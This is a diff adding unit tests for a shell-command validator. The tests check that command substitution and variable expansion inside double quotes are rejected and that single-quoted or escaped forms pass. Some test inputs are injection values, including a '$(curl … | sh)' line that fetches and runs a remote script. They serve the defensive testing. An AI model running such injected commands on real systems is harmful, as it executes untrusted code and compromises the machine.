@@ -134,6 +134,31 @@ describe("validateCommand", () => {
       expect(() => validateCommand("npm run ${HOME}", allowedCommands)).toThrow("shell operator");
       expect(() => validateCommand("node ${SCRIPT_PATH}", allowedCommands)).toThrow("shell operator");
     });
+
+    it("rejects substitution and expansion inside double quotes", () => {
+      // POSIX sh performs command substitution and parameter expansion inside
+      // double quotes, so the quote-aware scan must stay active for `$` and
+      // backtick there — only `; & | < > ( )` are literal between "".
+      expect(() => validateCommand('node -e "$(id)"', allowedCommands)).toThrow("shell operator");
+      expect(() => validateCommand("node -e \"`id`\"", allowedCommands)).toThrow("shell operator");
+      expect(() => validateCommand('node -e "${HOME}"', allowedCommands)).toThrow("shell operator");
+      expect(() => validateCommand('node -e "$(curl -s example.invalid/x | sh)"', allowedCommands))
+        .toThrow("shell operator");
+      expect(() => validateCommand('echo "path is $HOME"', allowedCommands)).toThrow("shell operator");
+    });
+
+    it("allows substitution characters inside single quotes", () => {
+      // Single quotes are wholly literal to sh — nothing expands there.
+      expect(() => validateCommand("node -e 'a; b; $(c)'", allowedCommands)).not.toThrow();
+      expect(() => validateCommand("node -e 'echo `id` ${HOME}'", allowedCommands)).not.toThrow();
+    });
+
+    it("allows a backslash-escaped $ or backtick inside double quotes", () => {
+      // `\$` and `` \` `` are escaped inside double quotes, so sh treats them
+      // as literal — the scanner's escape handling must agree.
+      expect(() => validateCommand('node -e "\\$(id)"', allowedCommands)).not.toThrow();
+      expect(() => validateCommand('node -e "\\`id\\`"', allowedCommands)).not.toThrow();
+    });
   });
 
   describe("dangerous pattern prevention", () => {
